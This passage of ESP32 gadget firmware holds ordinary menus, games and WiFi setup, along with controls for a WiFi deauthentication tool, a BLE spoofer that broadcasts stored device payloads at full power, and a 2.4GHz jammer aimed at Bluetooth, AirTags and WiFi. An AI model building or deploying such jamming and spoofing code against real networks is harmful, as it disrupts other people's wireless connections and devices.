  tft.setCursor(12, 104);
  tft.print(deauthTargetSsid);
  
  tft.setTextSize(1);
  tft.setTextColor(UI_ACCENT);
  tft.setCursor(12, 130);
  tft.print(String("Channel: ") + deauthTargetChannel);

  tft.setTextSize(2);
  tft.setTextColor(UI_OK);
  tft.setCursor(12, 170);
  tft.print("Packets: ");
  
  tft.fillRect(12, 192, 200, 24, UI_BG);
  tft.setCursor(12, 192);
  tft.setTextColor(UI_TEXT);
  tft.print(deauthPacketsSent);
}

static bool wifiConnectSelectedNetwork() {
  doNetworkInit();
  wifiStatusMessage = "Connecting...";
  wifiLastConnectOk = false;
  uiMarkDirty();
  if (!wifiSelectedOpen && wifiPasswordBuffer.length() == 0) {
    wifiStatusMessage = "Password empty";
    return false;
  }
  WiFi.mode(WIFI_STA);
  WiFi.persistent(true);
  WiFi.disconnect(false, false);
  delay(150);
  if (wifiSelectedOpen) WiFi.begin(wifiSelectedSsid.c_str());
  else WiFi.begin(wifiSelectedSsid.c_str(), wifiPasswordBuffer.c_str());
  uint32_t startMs = millis();
  while (millis() - startMs < 15000) {
    if (WiFi.status() == WL_CONNECTED) break;
    delay(120);
  }
  bool ok = (WiFi.status() == WL_CONNECTED);
  wifiLastConnectOk = ok;
  if (ok) {
    wifiLimitedMode = false;
    (void)wifiCredentialsSaveToFS(wifiSelectedSsid, wifiSelectedOpen ? String("") : wifiPasswordBuffer);
    timeSynced = false;
    lastTimeSyncAttemptMs = 0;
    timeTrySyncNtp();
    wifiStatusMessage = String("Connected: ") + wifiSelectedSsid;
    settingsMenuIndex = SETTING_ITEM_WIFI;
    uiEnter(UI_SETTINGS_MENU);
    return true;
  }
  wifiStatusMessage = "Connect failed";
  if (wifiLimitedMode) WiFi.mode(WIFI_OFF);
  uiEnter(UI_WIFI_KEYBOARD);
  return false;
}

// Callback for capturing BLE packets
class KaniBleCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    String mac = advertisedDevice.getAddress().toString().c_str();
    int rssi = advertisedDevice.getRSSI();
    String name = advertisedDevice.haveName() ? advertisedDevice.getName().c_str() : "";

    // Find existing device or add new
    int foundIdx = -1;
    for(int i=0; i<bleDevCount; i++) {
      if(bleDevices[i].mac == mac) { foundIdx = i; break; }
    }
    
    if(foundIdx >= 0) {
      bleDevices[foundIdx].rssi = rssi;
      bleDevices[foundIdx].packetCount++;
      if(name.length() > 0) bleDevices[foundIdx].name = name;
    } else if(bleDevCount < BLE_MAX_DEVICES) {
      bleDevices[bleDevCount].mac = mac;
      bleDevices[bleDevCount].name = name;
      bleDevices[bleDevCount].rssi = rssi;
      bleDevices[bleDevCount].packetCount = 1;
      bleDevCount++;
    }
    uiMarkDirty();
  }
};

static void stopDeauthIfActive() {
  if (!deauthKilling) return;
  deauthKilling = false;
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  WiFi.disconnect(false, false);
  WiFi.mode(WIFI_OFF);
}

static void bleEnsureInitialized() {
  if (bleInitialized) return;
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);
  BLEDevice::init("");
  bleInitialized = true;
}

static void bleEnterSession() {
  if (bleSessionActive) return;
  stopDeauthIfActive();
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  bleSessionActive = true;
}

static void bleActivateForMenu() {
  bleEnterSession();
  bleEnsureInitialized();
}

static void initBleScanner() {
  bleActivateForMenu();
  if (!pBLEScan) {
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new KaniBleCallbacks(), true);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
  }
}

static void triggerBleScan(bool resetData) {
  initBleScanner();
  if (resetData) {
    bleDevCount = 0;
    pBLEScan->clearResults();
  }
  bleStatusMessage = "Scanning (3s)...";
  uiMarkDirty();
  pBLEScan->start(3, false); // Block for 3 seconds
  bleStatusMessage = "Scan Complete";
  uiMarkDirty();
}

static void toggleBleSpoofer() {
  bleEnterSession();
  bleEnsureInitialized();
  if (!pBleAdvertising) {
    if (!pBleServer) pBleServer = BLEDevice::createServer();
    pBleAdvertising = pBleServer->getAdvertising();
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  }

  if (bleSpoofingActive) {
    pBleAdvertising->stop();
    bleSpoofingActive = false;
  } else {
    BLEAdvertisementData oAdvertisementData;

    String payload((char*)bleSpoofPayloads[bleSpoofIndex], 31);
    oAdvertisementData.addData(payload);

    pBleAdvertising->setAdvertisementData(oAdvertisementData);
    pBleAdvertising->setMinInterval(0x20);
    pBleAdvertising->setMaxInterval(0x20);
    pBleAdvertising->setMinPreferred(0x20);
    pBleAdvertising->setMaxPreferred(0x20);

    pBleAdvertising->start();
    bleSpoofingActive = true;
  }

  uiMarkDirty();
}

static void tftDrawRfJammer() {
  tftDrawHeader("2.4GHz Jammer");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:Mode OK:Start/Stop");

  tft.fillRoundRect(12, 60, 216, 46, 10, UI_CARD_SEL);
  tft.drawRoundRect(12, 60, 216, 46, 10, UI_ACCENT);
  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(22, 68);
  tft.print("Target Mode:");
  tft.setTextSize(2); tft.setTextColor(UI_TEXT); tft.setCursor(22, 82);
  if (nrfJamMode == 0) tft.print("BLE/AirTag");
  else if (nrfJamMode == 1) tft.print("Bluetooth");
  else tft.print("2.4GHz WiFi");

  tft.fillRoundRect(12, 120, 216, 60, 10, UI_CARD);
  tft.drawRoundRect(12, 120, 216, 60, 10, nrfJammingActive ? UI_WARN : UI_LINE);
  
  tft.setTextSize(2); 
#if !HAS_RF24_LIB
  tft.setTextColor(UI_WARN);
  tft.setCursor(30, 142);
  tft.setTextSize(1);
  tft.print("INSTALL RF24 LIBRARY!");
#else
  if (!nrfRadioFound) {
    tft.setTextColor(UI_WARN);
    tft.setCursor(30, 142);
    tft.setTextSize(1);
    tft.print("NO NRF24 MODULE!");
  } else {
    tft.setTextColor(nrfJammingActive ? UI_WARN : UI_OK);
    tft.setCursor(64, 142);
    tft.print(nrfJammingActive ? "JAMMING" : "IDLE");
  }
#endif
}

static void tftDrawBleSpoofer() {
  tftDrawHeader("BLE Spoofer");
  tft.setTextSize(1);
  tft.setTextColor(UI_MUTED);
  tft.setCursor(10, 40);
  tft.print("U/D:Device OK:Start/Stop");

  tft.fillRoundRect(12, 60, 216, 46, 10, UI_CARD_SEL);
  tft.drawRoundRect(12, 60, 216, 46, 10, UI_ACCENT);
  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(22, 68); tft.print("Target Device:");
  tft.setTextSize(2); tft.setTextColor(UI_TEXT); tft.setCursor(22, 82); tft.print(bleSpoofNames[bleSpoofIndex]);

  tft.fillRoundRect(12, 120, 216, 60, 10, UI_CARD);
  tft.drawRoundRect(12, 120, 216, 60, 10, bleSpoofingActive ? UI_WARN : UI_LINE);
  tft.setTextSize(2); tft.setTextColor(bleSpoofingActive ? UI_WARN : UI_OK);
  tft.setCursor(64, 142);
  tft.print(bleSpoofingActive ? "ATTACKING" : "IDLE");
}

static void tftDrawBleList(const char* title) {
  tftDrawHeader(title);
  tft.setTextSize(1); tft.setTextColor(UI_MUTED); tft.setCursor(10, 40);
  tft.print("U/D:nav OK:Scan OK+:back");

  const uint8_t rescanIndex = bleDevCount;
  const uint8_t itemCount = bleDevCount + 1;
  const uint8_t visibleCount = 4;
  uint8_t firstVisible = tftListFirstVisible(bleListIndex, itemCount, visibleCount);

  for (uint8_t row = 0; row < visibleCount; row++) {
    uint8_t i = firstVisible + row;
    if (i >= itemCount) break;
    int y = 58 + row * 42;
    bool selected = (i == bleListIndex);
    
    tft.fillRoundRect(12, y, 216, 34, 10, selected ? UI_CARD_SEL : UI_CARD);
    tft.drawRoundRect(12, y, 216, 34, 10, selected ? UI_ACCENT : UI_LINE);
    
    if (i == rescanIndex) {
      tft.setTextSize(2); tft.setTextColor(selected ? UI_TEXT : UI_MUTED);
      tft.setCursor(24, y + 8); tft.print("Scan Devices");
    } else {
      bool suspicious = (bleDevices[i].packetCount > 15);
      tft.setTextColor(suspicious ? UI_WARN : (selected ? UI_TEXT : UI_MUTED));
      
      tft.setTextSize(1); tft.setCursor(24, y + 6);
      String dName = bleDevices[i].name.length() > 0 ? bleDevices[i].name : "Unknown";
      if(dName.length() > 18) dName = dName.substring(0, 15) + "...";
      tft.print(dName);
      
      tft.setCursor(24, y + 22); tft.print(bleDevices[i].mac);
      
      tft.setCursor(135, y + 22);
      tft.print(String(bleDevices[i].rssi) + " dBm");
      tft.setCursor(190, y + 22);
      tft.print(String("P") + bleDevices[i].packetCount);
    }
  }
  
  if (bleStatusMessage.length() > 0) {
    tft.fillRect(12, 228, 216, 10, UI_BG);
    tft.setTextSize(1); tft.setTextColor(UI_OK); tft.setCursor(12, 230);
    tft.print(bleStatusMessage);
  }
  tftDrawListScrollbar(226, 60, 140, itemCount, visibleCount, firstVisible);
}


static void uiLoop() {
  btnUpdate(btnUp);
  btnUpdate(btnDown);
  btnUpdate(btnOk);
  if (isSleepActive()) {
    if (okShortClick() || okLongPress()) {
      tftExitSleep();
      uiPlayWakeTone();
    }
    return;
  }
  if (appMode == APP_CAMERA) {
    if (okLongPress()) {
      uiPlayBackTone();
      exitToUi();
      return;
    }
    if (okShortClick()) {
      uiPlayOkTone();
      cameraCaptureRequest();
      return;
    }
    return;
  }
  if (appMode == APP_VIEW_BMP || appMode == APP_VIEW_GIF || appMode == APP_MATRIX_TEXT) {
    if (okShortClick() || okLongPress()) {
      uiPlayBackTone();
      if (appMode == APP_MATRIX_TEXT) {
        appMode = APP_UI;
        matrixClear();
        matrixCommitToPixels();
        uiEnter(UI_MATRIX_TEXT_MENU);
      } else {
        // If we opened the image viewer from another UI screen (like File Explorer),
        // restore that screen instead of jumping to main menu.
        if (prevUiScreenBeforeView != UI_MENU) {
          appMode = APP_UI;
          uiEnter(prevUiScreenBeforeView);
          prevUiScreenBeforeView = UI_MENU;
        } else {
          exitToUi();
        }
      }
    }
    if (appMode != APP_MATRIX_TEXT) return; // Karena MATRIX_TEXT perlu diteruskan loopnya di luar uiLoop
  }
  if (appMode == APP_GAME) {
    if (gameView == GAME_VIEW_MENU) {
      if (okLongPress()) { uiPlayBackTone(); gameStop(true); return; }
      if (btnUp.pressEvent) {
        gameMenuIndex = (gameMenuIndex == 0) ? (GAME_ITEM_COUNT - 1) : (gameMenuIndex - 1);
        uiPlayMoveTone();
        tftDrawGameMenu(true);
      }
      if (btnDown.pressEvent) {
        gameMenuIndex = (gameMenuIndex + 1) % GAME_ITEM_COUNT;
        uiPlayMoveTone();
        tftDrawGameMenu(true);
      }
      if (okShortClick()) {
        uiPlayOkTone();
        if (gameMenuIndex == GAME_ITEM_SHOOTER) gameStartShooter();
        else if (gameMenuIndex == GAME_ITEM_TETRIS) tetrisStart();
        else if (gameMenuIndex == GAME_ITEM_WATER) {
          if (!imuOn) {
            QMI8658_SetEnabled(true);
            (void)imuSaveToFS();
          }
          if (!matrixSceneBackupValid) matrixCaptureScene();
          waterMode = true;
          game.active = false;
          tetrisStop();
          pongStop();
          gameView = GAME_VIEW_WATER;
          waterReset();
          enterMode(APP_GAME);
          tftDrawWaterHud(true);
        }
        else if (gameMenuIndex == GAME_ITEM_PONG) {
          pongStart();
        }
        return;
      }
    } else {
      if (okLongPress()) { uiPlayBackTone(); gameStop(false); return; }
      if (gameView == GAME_VIEW_SHOOTER && game.over && okShortClick()) { uiPlayOkTone(); gameStartShooter(); return; }
      if (gameView == GAME_VIEW_PONG && pong.over && okShortClick()) { uiPlayOkTone(); pongStart(); return; }
      if (gameView == GAME_VIEW_TETRIS) {
        if (tetris.over && okShortClick()) { uiPlayOkTone(); tetrisStart(); return; }
        if (btnUp.pressEvent) { uiPlayMoveTone(); tetrisRotate(+1); }
        if (btnDown.pressEvent) { uiPlayMoveTone(); tetrisRotate(-1); }
      }
    }
    return;
  }
  if (okLongPress() && uiScreen != UI_MENU) {
    uiPlayBackTone();
    if (uiScreen == UI_SET_TFT_BL || uiScreen == UI_SET_MATRIX_BR || uiScreen == UI_SET_UTC_OFFSET) uiEnter(UI_SETTINGS_MENU);
    else if (uiScreen == UI_WIFI_LIST || uiScreen == UI_WIFI_KEYBOARD) uiEnter(UI_SETTINGS_MENU);
    // Tambahkan navigasi balik untuk fitur Deauth di sini
    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_DEAUTH_REASON_PICKER) uiEnter(UI_TOOLS_MENU); 
    else if (uiScreen == UI_FILE_EXPLORER || uiScreen == UI_MATRIX_TEXT_MENU || uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) {
      if (uiScreen == UI_NOTE_EDITOR_MENU || uiScreen == UI_NOTE_EDITOR_MAIN) noteStopPlay();
      uiEnter(UI_TOOLS_MENU);
    }
    else if (uiScreen == UI_DEAUTH_SCANNER || uiScreen == UI_BLE_SPOOFER || uiScreen == UI_BLE_SCANNER || uiScreen == UI_RF_JAMMER) {
      if (uiScreen == UI_BLE_SPOOFER && bleSpoofingActive) toggleBleSpoofer();
      if (uiScreen == UI_RF_JAMMER && nrfJammingActive) {
        nrfJammingActive = false;
#if HAS_RF24_LIB
        if (nrfRadioFound) {
          nrfRadio.stopConstCarrier();
          nrfRadio.powerDown();
          nrfRadio.powerUp();
        }
#endif
      }
      stopDeauthIfActive();
      uiEnter(UI_TOOLS_MENU);
    }
    else if (uiScreen == UI_FILE_ACTION) uiEnter(UI_FILE_EXPLORER);
    else if (uiScreen == UI_FILE_VIEWER) uiEnter(UI_FILE_ACTION);
    else if (uiScreen == UI_MATRIX_TEXT_KEYBOARD) {
      if (textKeyboardTarget == TEXT_TARGET_MATRIX) uiEnter(UI_MATRIX_TEXT_MENU);
      else if (textKeyboardTarget == TEXT_TARGET_SONG_NOTE) uiEnter(UI_SONG_MENU);
      else uiEnter(UI_NOTE_EDITOR_MAIN);
    }
    else if (uiScreen == UI_TOOL_CALC || uiScreen == UI_TOOL_STOPWATCH || uiScreen == UI_TOOL_TIMER || uiScreen == UI_TOOL_LAMP) {
      if (uiScreen == UI_TOOL_LAMP && lampOn) lampSetEnabled(false);
      uiEnter(UI_TOOLS_MENU);
    }
    else uiEnter(UI_MENU);
    return;
  }
  if (uiScreen == UI_MENU) {
    if (btnUp.pressEvent) { uiIndex--; if (uiIndex < 0) uiIndex = UI_ICON_COUNT - 1; uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { uiIndex++; if (uiIndex >= UI_ICON_COUNT) uiIndex = 0; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      switch ((UiIcon)uiIndex) {
        case ICON_GAME: gameEnterMenu(); return;
        case ICON_MEDIA: mediaMenuIndex = 0; uiEnter(UI_MEDIA_MENU); return;
        case ICON_SETTINGS: settingsMenuIndex = 0; uiEnter(UI_SETTINGS_MENU); return;
        case ICON_TOOLS: toolsMenuIndex = 0; uiEnter(UI_TOOLS_MENU); return;
        case ICON_SLEEP: tftEnterSleep(); return;
        case ICON_SONG:
          songMenuIndex = (currentSong == SONG_ID_NONE) ? 0 : (uint8_t)currentSong;
          uiEnter(UI_SONG_MENU);
          return;
      }
    }
  } else if (uiScreen == UI_MEDIA_MENU) {
    if (btnUp.pressEvent) { mediaMenuIndex = (mediaMenuIndex == 0) ? (MEDIA_ITEM_COUNT - 1) : (mediaMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { mediaMenuIndex = (mediaMenuIndex + 1) % MEDIA_ITEM_COUNT; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
        if (mediaMenuIndex == MEDIA_ITEM_BMP) {
        bmpViewPath = BMP_PATH;
        prevUiScreenBeforeView = uiScreen;
        enterMode(APP_VIEW_BMP);
      } else if (mediaMenuIndex == MEDIA_ITEM_GIF) {
        enterMode(APP_VIEW_GIF);
      } else if (mediaMenuIndex == MEDIA_ITEM_CAMERA) {
        enterMode(APP_CAMERA);
      }
      return;
    }
  } else if (uiScreen == UI_SETTINGS_MENU) {
    if (btnUp.pressEvent) { settingsMenuIndex = (settingsMenuIndex == 0) ? (SETTING_ITEM_COUNT - 1) : (settingsMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { settingsMenuIndex = (settingsMenuIndex + 1) % SETTING_ITEM_COUNT; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      switch (settingsMenuIndex) {
        case SETTING_ITEM_TFT_BL: uiEditValue = gTftBacklight; uiEnter(UI_SET_TFT_BL); return;
        case SETTING_ITEM_LED_BR: uiEditValue = gBrightness; uiEnter(UI_SET_MATRIX_BR); return;
        case SETTING_ITEM_UTC: uiOffsetIdx = utcOffsetIndexFromMinutes(gUtcOffsetMinutes); uiEnter(UI_SET_UTC_OFFSET); return;
        case SETTING_ITEM_WIFI:
          wifiScanAndShowList();
          return;
        case SETTING_ITEM_IMU:
          QMI8658_SetEnabled(!imuOn);
          (void)imuSaveToFS();
          uiMarkDirty();
          return;
        case SETTING_ITEM_UI_SFX:
          uiSfxEnabled = !uiSfxEnabled;
          (void)uiSfxSaveToFS();
          uiMarkDirty();
          return;
        case SETTING_ITEM_SLEEP_MODE:
          sleepMode = (SleepMode)(((int)sleepMode + 1) % 5);
          (void)sleepModeSaveToFS();
          uiMarkDirty();
          return;
        case SETTING_ITEM_CLOCK_VIEW:
          clockDisplayMode = (ClockDisplayMode)(((int)clockDisplayMode + 1) % 3);
          (void)clockDisplaySaveToFS();
          uiMarkDirty();
          return;
        case SETTING_ITEM_CAM_URL:
          // Open text keyboard initialized with current camera URL
          textKeyboardBuffer = cameraUrl;
          textKeyboardTarget = TEXT_TARGET_CAMERA_URL;
          textKeyboardMode = WIFI_KEYS_ALPHA;
          textKeyboardShift = false;
          textKeyboardRow = 0; textKeyboardCol = 0;
          textKeyboardUpLatched = false; textKeyboardDownLatched = false;
          uiEnter(UI_MATRIX_TEXT_KEYBOARD);
          return;
        case SETTING_ITEM_BUZZER_VOL:
          buzzerVolume = (buzzerVolume + 1) % 11;
          (void)buzzerVolSaveToFS();
          if (buzzerVolume > 0) buzzerTone(1760, 60);
          uiMarkDirty();
          return;
      }
    }
  } else if (uiScreen == UI_WIFI_LIST) {
    bool hasSaved = savedWifiSsid.length() > 0;
    uint8_t rescanIndex = wifiScanCount;
    uint8_t reconnectIndex = wifiScanCount + (hasSaved ? 1 : 0);
    uint8_t forgetIndex = wifiScanCount + (hasSaved ? 2 : 0);
    uint8_t itemCount = wifiScanCount + 1 + (hasSaved ? 2 : 0);
    if (btnUp.pressEvent) { wifiListIndex = (wifiListIndex == 0) ? (itemCount - 1) : (wifiListIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { wifiListIndex = (wifiListIndex + 1) % itemCount; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (wifiListIndex == rescanIndex) {
        wifiScanAndShowList();
      } else if (hasSaved && wifiListIndex == reconnectIndex) {
        wifiSelectedSsid = savedWifiSsid;
        wifiSelectedOpen = (savedWifiPass.length() == 0);
        wifiPasswordBuffer = savedWifiPass;
        (void)wifiConnectSelectedNetwork();
      } else if (hasSaved && wifiListIndex == forgetIndex) {
        wifiForgetCredentials();
        wifiStatusMessage = "Saved WiFi removed";
        wifiLastConnectOk = false;
        wifiListIndex = 0;
        uiMarkDirty();
      } else {
        wifiSelectedSsid = wifiScanSsids[wifiListIndex];
        wifiSelectedOpen = wifiScanOpen[wifiListIndex];

        if (hasSaved && wifiSelectedSsid == savedWifiSsid) {
          // Bila SSID sama dengan yang disimpan, langsung gunakan password yang ada
          wifiPasswordBuffer = savedWifiPass;
          wifiSelectedOpen = (savedWifiPass.length() == 0);
          (void)wifiConnectSelectedNetwork();
        } else {
          wifiPasswordBuffer = "";
          wifiKeyboardMode = WIFI_KEYS_ALPHA;
          wifiKeyboardShift = false;
          wifiKeyboardRow = 0;
          wifiKeyboardCol = 0;
          wifiKeyboardUpLongLatched = false;
          wifiKeyboardDownLongLatched = false;
          wifiStatusMessage = wifiSelectedOpen ? String("Open network") : String("Enter password");
          if (wifiSelectedOpen) {
            (void)wifiConnectSelectedNetwork();
          } else {
            uiEnter(UI_WIFI_KEYBOARD);
          }
        }
      }
      return;
    }
  } else if (uiScreen == UI_WIFI_KEYBOARD) {
    if (!btnUp.stable) wifiKeyboardUpLongLatched = false;
    if (!btnDown.stable) wifiKeyboardDownLongLatched = false;
    if (btnUp.pressEvent) { wifiKeyboardMoveCol(-1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { wifiKeyboardMoveCol(+1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnUp.stable && btnUp.longFired && !wifiKeyboardUpLongLatched) {
      wifiKeyboardUpLongLatched = true;
      wifiKeyboardMoveRow(-1);
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (btnDown.stable && btnDown.longFired && !wifiKeyboardDownLongLatched) {
      wifiKeyboardDownLongLatched = true;
      wifiKeyboardMoveRow(+1);
      uiPlayMoveTone();
      uiMarkDirty();
    }
    if (okShortClick()) {
      uiPlayOkTone();
      wifiKeyboardActivate();
      uiMarkDirty();
      return;
    }
  } else if (uiScreen == UI_SONG_MENU) {
    if (btnUp.pressEvent) { songMenuIndex = (songMenuIndex == 0) ? (SONG_ITEM_COUNT - 1) : (songMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { songMenuIndex = (songMenuIndex + 1) % SONG_ITEM_COUNT; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (songMenuIndex == SONG_ITEM_STOP) {
        songStop();
        noteStopPlay();
      } else if (songMenuIndex == SONG_ITEM_NOTE_FILE) {
        textKeyboardBuffer = noteLoadedName;
        textKeyboardTarget = TEXT_TARGET_SONG_NOTE;
        textKeyboardMode = WIFI_KEYS_ALPHA;
        textKeyboardShift = false;
        textKeyboardRow = 0;
        textKeyboardCol = 0;
        textKeyboardUpLatched = false;
        textKeyboardDownLatched = false;
        uiEnter(UI_MATRIX_TEXT_KEYBOARD);
        return;
      } else {
        noteStopPlay();
        songStartSelected((SongId)songMenuIndex);
      }
      uiMarkDirty();
      return;
    }
  } else if (uiScreen == UI_TOOLS_MENU) {
    if (btnUp.pressEvent) { toolsMenuIndex = (toolsMenuIndex == 0) ? (TOOLS_ITEM_COUNT - 1) : (toolsMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { toolsMenuIndex = (toolsMenuIndex + 1) % TOOLS_ITEM_COUNT; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (toolsMenuIndex == TOOLS_ITEM_CALC) uiEnter(UI_TOOL_CALC);
      else if (toolsMenuIndex == TOOLS_ITEM_STOPWATCH) uiEnter(UI_TOOL_STOPWATCH);
      else if (toolsMenuIndex == TOOLS_ITEM_TIMER) uiEnter(UI_TOOL_TIMER);
      else if (toolsMenuIndex == TOOLS_ITEM_LAMP) uiEnter(UI_TOOL_LAMP);
      else if (toolsMenuIndex == TOOLS_ITEM_DEAUTH) startDeauthScan(); 
      else if (toolsMenuIndex == TOOLS_ITEM_TEXT_LED) uiEnter(UI_MATRIX_TEXT_MENU);
      else if (toolsMenuIndex == TOOLS_ITEM_NOTE_EDITOR) {
        noteEditorMenuIndex = 0;
        uiEnter(UI_NOTE_EDITOR_MENU);
      }
      else if (toolsMenuIndex == TOOLS_ITEM_FILE) {
        explorerRefresh();
        uiEnter(UI_FILE_EXPLORER);
      }
      else if (toolsMenuIndex == TOOLS_ITEM_BLE_SPOOF) {
        bleActivateForMenu();
        bleSpoofIndex = 0;
        bleSpoofingActive = false;
        uiEnter(UI_BLE_SPOOFER);
      }
      else if (toolsMenuIndex == TOOLS_ITEM_BLE_SCAN) {
        bleActivateForMenu();
        bleListIndex = 0;
        bleDevCount = 0;
        if (pBLEScan) pBLEScan->clearResults();
        bleStatusMessage = "Ready";
        uiEnter(UI_BLE_SCANNER);
      }
      else if (toolsMenuIndex == TOOLS_ITEM_RF_JAMMER) {
        uiEnter(UI_RF_JAMMER);
      }
      return;
    }
  } else if (uiScreen == UI_MATRIX_TEXT_MENU) {
    if (btnUp.pressEvent) { matrixTextMenuIndex = (matrixTextMenuIndex == 0) ? 5 : (matrixTextMenuIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { matrixTextMenuIndex = (matrixTextMenuIndex + 1) % 6; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (matrixTextMenuIndex == 0) { // Play
        matrixStartText();
      } else if (matrixTextMenuIndex == 1) { // Edit
        textKeyboardBuffer = matrixTextSaved;
        textKeyboardTarget = TEXT_TARGET_MATRIX;
        textKeyboardMode = WIFI_KEYS_ALPHA;
        textKeyboardShift = false;
        textKeyboardRow = 0; textKeyboardCol = 0;
        textKeyboardUpLatched = false; textKeyboardDownLatched = false;
        uiEnter(UI_MATRIX_TEXT_KEYBOARD);
      } else if (matrixTextMenuIndex == 2) { // Mode
        matrixTextScroll = !matrixTextScroll;
        uiMarkDirty();
      } else if (matrixTextMenuIndex == 3) { // Color
        matrixTextColorIdx = (matrixTextColorIdx + 1) % 8;
        CRGB colors[] = {CRGB::White, CRGB::Red, CRGB::Green, CRGB::Blue, CRGB::Yellow, CRGB::Purple, CRGB::Cyan, CRGB::Orange};
        matrixTextColor = colors[matrixTextColorIdx];
        uiMarkDirty();
      } else if (matrixTextMenuIndex == 4) { // Save
        File f = LittleFS.open("/matrixTxt.txt", "w");
        if(f) { f.print(matrixTextSaved); f.close(); }
        uiMarkDirty();
      } else if (matrixTextMenuIndex == 5) { // Load
        File f = LittleFS.open("/matrixTxt.txt", "r");
        if(f) { matrixTextSaved = f.readString(); f.close(); }
        uiMarkDirty();
      }
      return;
    }
  } else if (uiScreen == UI_MATRIX_TEXT_KEYBOARD) {
    if (!btnUp.stable) textKeyboardUpLatched = false;
    if (!btnDown.stable) textKeyboardDownLatched = false;
    if (btnUp.pressEvent) { textKeyboardCol = (textKeyboardCol == 0) ? (textKeyboardRow == 3 ? 3 : 9) : textKeyboardCol - 1; uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { textKeyboardCol = (textKeyboardCol + 1) % (textKeyboardRow == 3 ? 4 : 10); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnUp.stable && btnUp.longFired && !textKeyboardUpLatched) {
      textKeyboardUpLatched = true;
      textKeyboardRow = (textKeyboardRow == 0) ? 3 : textKeyboardRow - 1;
      if (textKeyboardRow == 3 && textKeyboardCol > 3) textKeyboardCol = 3;
      uiPlayMoveTone(); uiMarkDirty();
    }
    if (btnDown.stable && btnDown.longFired && !textKeyboardDownLatched) {
      textKeyboardDownLatched = true;
      textKeyboardRow = (textKeyboardRow + 1) % 4;
      if (textKeyboardRow == 3 && textKeyboardCol > 3) textKeyboardCol = 3;
      uiPlayMoveTone(); uiMarkDirty();
    }
    if (okShortClick()) {
      uiPlayOkTone();
      textKeyboardActivate();
      uiMarkDirty();
      return;
    }
  } else if (uiScreen == UI_FILE_EXPLORER) {
    if (btnUp.pressEvent) {
      if (explorerFileCount > 0) {
        uint8_t prev = explorerListIndex;
        explorerListIndex = (explorerListIndex == 0) ? (explorerFileCount - 1) : (explorerListIndex - 1);
        uiPlayMoveTone();
        // redraw only the list area to avoid a full-screen header clear
        tftRedrawFileList(explorerListIndex);
      }
    }
    if (btnDown.pressEvent) {
      if (explorerFileCount > 0) {
        uint8_t prev = explorerListIndex;
        explorerListIndex = (explorerListIndex + 1) % explorerFileCount;
        uiPlayMoveTone();
        tftRedrawFileList(explorerListIndex);
      }
    }
    if (okShortClick()) {
      uiPlayOkTone();
      if(explorerFileCount > 0) {
        uiIndex = 0; // Default action: Cancel
        uiEnter(UI_FILE_ACTION);
      }
      return;
    }
  } else if (uiScreen == UI_FILE_ACTION) {
    if (btnUp.pressEvent) { uiIndex = (uiIndex == 0) ? 2 : (uiIndex - 1); uiPlayMoveTone(); uiMarkDirty(); }
    if (btnDown.pressEvent) { uiIndex = (uiIndex + 1) % 3; uiPlayMoveTone(); uiMarkDirty(); }
    if (okShortClick()) {
      uiPlayOkTone();
      if (uiIndex == 1) { // View
        String p = explorerFileNames[explorerListIndex];
        String pl = p;
        pl.toLowerCase();
        if (pl.endsWith(".bmp") || pl.endsWith(".jpg") || pl.endsWith(".jpeg")) {
          bmpViewPath = p;
          prevUiScreenBeforeView = uiScreen;
          enterMode(APP_VIEW_BMP);
          return;
        } else if (pl.endsWith(".txt")) {
          fileViewerLoadFromPath(p);
          uiEnter(UI_FILE_VIEWER);
          return;
        }
      } else if (uiIndex == 2) { // Delete
        LittleFS.remove(explorerFileNames[explorerListIndex]);
        explorerRefresh();
      }
      uiEnter(UI_FILE_EXPLORER);
      return;
    }
  } else if (uiScreen == UI_FILE_VIEWER) {
    const uint8_t visibleLines = 24;
    if (btnUp.pressEvent && fileViewerScrollLines > 0) { fileViewerScrollLines--; uiPlayMoveTone(); uiMarkDirty(); }
